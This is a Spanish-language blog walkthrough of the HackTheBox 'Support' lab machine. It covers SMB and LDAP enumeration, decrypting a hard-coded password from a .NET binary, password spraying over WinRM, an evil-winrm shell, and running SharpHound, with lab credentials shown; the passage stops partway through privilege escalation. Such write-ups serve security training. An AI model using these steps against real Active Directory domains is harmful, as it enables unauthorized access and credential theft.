<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Support (easy) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Support (easy)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-11T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Support (easy)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-11T00:00:00-06:00","datePublished":"2024-04-11T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Support (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Support (easy)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-11T00:00:00-06:00" itemprop="datePublished">
        Apr 11, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png" />
</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus tecnologias con la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49711 10.129.245.29 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-29 12:41 CST
Nmap scan report <span class="k">for </span>10.129.245.29
Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-03-29T18:42:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar en nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>

➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.245.29 support.htb dc.support.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.245.29 support.htb dc.support.htb
</code></pre></div></div>

<ul>
  <li>Si listamos los recursos compartidos por el protocolo <strong>smb</strong> vemos que tenemos acceso a un directorio llamado <strong>support-tools</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] support.htb<span class="se">\m</span>iguel:
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.129.245.29   445    DC               Share           Permissions     Remark
SMB         10.129.245.29   445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.245.29   445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.245.29   445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.129.245.29   445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.245.29   445    DC               NETLOGON                        Logon server share
SMB         10.129.245.29   445    DC               support-tools   READ            support staff tools
SMB         10.129.245.29   445    DC               SYSVOL                          Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos al recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient support.htb/miguel@10.129.245.29 <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use support-tools</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Wed Jul 20 12:01:06 2022 <span class="nb">.</span>
drw-rw-rw-          0  Sat May 28 06:18:25 2022 ..
<span class="nt">-rw-rw-rw-</span>    2880728  Sat May 28 06:19:19 2022 7-ZipPortable_21.07.paf.exe
<span class="nt">-rw-rw-rw-</span>    5439245  Sat May 28 06:19:55 2022 npp.8.4.1.portable.x64.zip
<span class="nt">-rw-rw-rw-</span>    1273576  Sat May 28 06:20:06 2022 putty.exe
<span class="nt">-rw-rw-rw-</span>   48102161  Sat May 28 06:19:31 2022 SysinternalsSuite.zip
<span class="nt">-rw-rw-rw-</span>     277499  Wed Jul 20 12:01:07 2022 UserInfo.exe.zip
<span class="nt">-rw-rw-rw-</span>      79171  Sat May 28 06:20:17 2022 windirstat1_1_2_setup.exe
<span class="nt">-rw-rw-rw-</span>   44398000  Sat May 28 06:19:43 2022 WiresharkPortable64_3.6.5.paf.exe
</code></pre></div></div>

<ul>
  <li>Encontramos varios <code class="language-plaintext highlighter-rouge">.exe</code> pero sin duda el que llama mas la atención es el <strong>UserInfo.exe.zip</strong> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get UserInfo.exe.zip</span>
</code></pre></div></div>

<ul>
  <li>Antes de descomprimirlo vamos a ver que es lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l UserInfo.exe.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 277499 bytes <span class="o">(</span>271 KiB<span class="o">)</span>

Listing archive: UserInfo.exe.zip

<span class="nt">--</span>
Path <span class="o">=</span> UserInfo.exe.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 277499

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05             652675       274861  12 files
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno al parecer hay muchos archivos de configuración así que para ver mejor el contenido y ver que se hace por detrás vamos a pasar el comprimido a una maquina Windows para usar <code class="language-plaintext highlighter-rouge">dnspy</code> y <code class="language-plaintext highlighter-rouge">debugear</code> el archivo <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Debugeando</code> encontramos un código interesante.</p>
  </li>
  <li>
    <p>El código configura una conexión LDAP llama a un método <code class="language-plaintext highlighter-rouge">Protected.getPassword()</code> para recuperar una contraseña.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/1.png" />
</p>

<ul>
  <li>Si nos vamos a <code class="language-plaintext highlighter-rouge">Protected</code> vemos el código que al parecer lo que hace es desencriptar una contraseña que esta codificada en <code class="language-plaintext highlighter-rouge">base64</code> y encriptada mediante una operación <code class="language-plaintext highlighter-rouge">XOR</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/2.png" />
</p>

<ul>
  <li>En el campo <code class="language-plaintext highlighter-rouge">enc_password</code> almacena una cadena que es una contraseña encriptada que esta en formato base64 y el campo <code class="language-plaintext highlighter-rouge">key</code> almacena una clave en forma de arreglo la clave parece ser derivada de la cadena <strong>armando</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/3.png" />
</p>

<ul>
  <li>
    <p>El problema de esto es que sabemos como funciona todo para poder obtener la contraseña en texto plano podemos usar Python3 para obtenerla simplemente siguiendo el funcionamiento del código.</p>
  </li>
  <li>
    <p>Simplemente ejecutamos <code class="language-plaintext highlighter-rouge">Python3</code> e importamos el modulo <code class="language-plaintext highlighter-rouge">base64</code> para decodificar la contraseña encriptada, después la variable <code class="language-plaintext highlighter-rouge">enc_password</code> contiene la contraseña encriptada, la clave <code class="language-plaintext highlighter-rouge">key</code> contiene la clave para la operación <code class="language-plaintext highlighter-rouge">XOR</code> que en este caso la clave es la cadena <code class="language-plaintext highlighter-rouge">ASCII</code> <strong>armando</strong>, después la contraseña encriptada se decodifica, se realiza la operación mediante un ciclo for que itera sobre cada byte de la contraseña encriptada y lo desencripta utilizando la calve y el valor (223) mediante la operación <code class="language-plaintext highlighter-rouge">XOR</code> y al final el resultado se convierte a una cadena utilizando caracteres <code class="language-plaintext highlighter-rouge">UTF-8</code> y se muestra por pantalla.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3
Python 3.11.8 <span class="o">(</span>main, Feb  7 2024, 21:52:08<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import <span class="nb">base64</span>
<span class="o">&gt;&gt;&gt;</span> enc_password <span class="o">=</span> <span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>
<span class="o">&gt;&gt;&gt;</span> key <span class="o">=</span> bytes<span class="o">(</span><span class="s2">"armando"</span>, <span class="nv">encoding</span><span class="o">=</span><span class="s1">'ascii'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decoded_password <span class="o">=</span> base64.b64decode<span class="o">(</span>enc_password<span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decrypted_password <span class="o">=</span> bytes<span class="o">([</span>decoded_password[i] ^ key[i % len<span class="o">(</span>key<span class="o">)]</span> ^ 223 <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>decoded_password<span class="o">))])</span>
<span class="o">&gt;&gt;&gt;</span> password <span class="o">=</span> decrypted_password.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span><span class="s2">"Decrypted Password:"</span>, password<span class="o">)</span>
Decrypted Password: nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<h2 id="shell-as-support">Shell as Support</h2>

<ul>
  <li>Una vez tenemos la contraseña en texto plano podemos comprobar si son correctas ya que nos decía que con el usuario <code class="language-plaintext highlighter-rouge">ldap</code> podemos conectarnos al servicio utilizando la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.129.245.29 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.129.245.29   389    DC               <span class="o">[</span>+] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
</code></pre></div></div>

<ul>
  <li>
    <p>Al ver que son correctas podemos enumerar el servicio <code class="language-plaintext highlighter-rouge">ldap</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
  </li>
  <li>
    <p>Al parecer el output es demasiada información pero si <code class="language-plaintext highlighter-rouge">grepeamos</code> por <code class="language-plaintext highlighter-rouge">info:</code> encontramos una contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ldapsearch <span class="nt">-H</span> ldap://support.htb <span class="nt">-D</span> <span class="s1">'support\ldap'</span> <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span> | <span class="nb">grep </span>info:
info: Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Al parecer es del usuario <code class="language-plaintext highlighter-rouge">Support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>info: Ironside47pleasure40Watchful
memberOf: <span class="nv">CN</span><span class="o">=</span>Shared Support Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: <span class="nv">CqM5MfoxMEWepIBTs5an8Q</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
</code></pre></div></div>

<ul>
  <li>Probando con <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos conectarnos y enumerar los usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span>
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña vamos a guardar los usuarios en una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  content <span class="nb">cat </span>users.txt
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
</code></pre></div></div>

<ul>
  <li>Vamos a ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> con la contraseña que tenemos para ver si le pertenece a otro usuario por que con <code class="language-plaintext highlighter-rouge">rpcclient</code> vimos que es de <code class="language-plaintext highlighter-rouge">support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.245.29 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
HTTP        10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.245.29:5985/wsman
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\A</span>dministrator:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\G</span>uest:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\k</span>rbtgt:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>dap:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful <span class="o">(</span>Pwn3d!<span class="o">)</span>
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>mith.rosario:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\h</span>ernandez.stanley:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>ilson.shelby:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\a</span>nderson.damian:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\t</span>homas.raphael:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>evine.leopoldo:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\r</span>aven.clifton:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\b</span>ardot.mary:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\c</span>romwell.gerard:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\m</span>onroe.david:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>est.laura:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>angley.lucy:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\d</span>aughtler.mabel:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>toll.rachelle:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\f</span>ord.victoria:Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Nos podemos conectar gracias a que el usuario <strong>support</strong> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> support.htb <span class="nt">-u</span> support <span class="nt">-p</span> Ironside47pleasure40Watchful

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>support<span class="se">\s</span>upport
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
05e7a42ec2aa2d13e6eaee5383b2ed97
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Para enumerar la maquina y poder ver vias potenciales de elevar nuestros privilegios vamos a usar <strong>Bloodhound</strong> <a href="https://www.kali.org/tools/bloodhound/">https://www.kali.org/tools/bloodhound/</a>.</p>
  </li>
  <li>
    <p>Para eso vas a necesitar descargar el <strong>.zip</strong> <a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip SharpHound-v2.3.3.zip
Archive:  SharpHound-v2.3.3.zip
  inflating: SharpHound.exe
  inflating: SharpHound.exe.config
  inflating: SharpHound.pdb
  inflating: SharpHound.ps1
  inflating: System.Console.dll
  inflating: System.Diagnostics.Tracing.dll
  inflating: System.Net.Http.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/SharpHound.exe

Info: Uploading /home/miguel/Hackthebox/Support/content/SharpHound.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.exe

Data: 1791316 bytes of 1791316 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el comprimido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Ese <code class="language-plaintext highlighter-rouge">.zip</code> lo vamos a subir a <code class="language-plaintext highlighter-rouge">BloodHound</code> vamos a descargarlo.</li>
</ul>

